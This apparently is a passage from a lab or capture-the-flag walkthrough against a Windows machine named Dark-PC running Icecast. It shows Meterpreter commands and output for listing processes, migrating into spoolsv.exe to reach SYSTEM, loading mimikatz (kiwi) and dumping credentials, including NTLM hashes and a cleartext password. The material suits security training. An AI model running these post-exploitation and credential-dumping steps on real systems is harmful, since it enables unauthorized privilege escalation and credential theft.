```
(Meterpreter 2)(C:\Windows\system32) > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                  x64   0
 416   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 496   692   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 584   692   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 760   692   sppsvc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 820   692   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 888   692   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 936   692   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1056  692   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1176  820   WmiPrvSE.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 1200  692   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1308  496   dwm.exe                 x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1324  1300  explorer.exe            x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1380  692   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1408  692   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1448  692   taskhost.exe            x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1472  820   WmiPrvSE.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1568  692   amazon-ssm-agent.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1632  692   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1652  692   LiteAgent.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1692  692   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1852  692   Ec2Config.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.
                                                                                  exe
 2028  692   vds.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2060  692   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2152  1052  powershell.exe          x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershe
                                                                                  ll.exe
 2196  692   VSSVC.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VSSVC.exe
 2224  692   TrustedInstaller.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2272  1324  Icecast2.exe            x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2312  2272  cmd.exe                 x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 2364  604   conhost.exe             x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2424  692   svchost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2612  692   SearchIndexer.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2788  604   conhost.exe             x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2856  820   rundll32.exe            x64   1        Dark-PC\Dark                  C:\Windows\System32\rundll32.exe
 2892  2856  dinotify.exe            x64   1        Dark-PC\Dark                  C:\Windows\System32\dinotify.exe
 3124  2612  SearchProtocolHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe
 3156  2612  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe
```

Migrating the process

```
(Meterpreter 2)(C:\Windows\system32) > migrate -N spoolsv.exe
[*] Migrating from 2152 to 1380...
[*] Migration completed successfully.
(Meterpreter 2)(C:\Windows\system32) > 
```

```
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 2)(C:\Windows\system32) > 
```

```
(Meterpreter 2)(C:\Windows\system32) > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
(Meterpreter 2)(C:\Windows\system32) > 
```

```
(Meterpreter 2)(C:\Windows\system32) > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)


(Meterpreter 2)(C:\Windows\system32) > 
```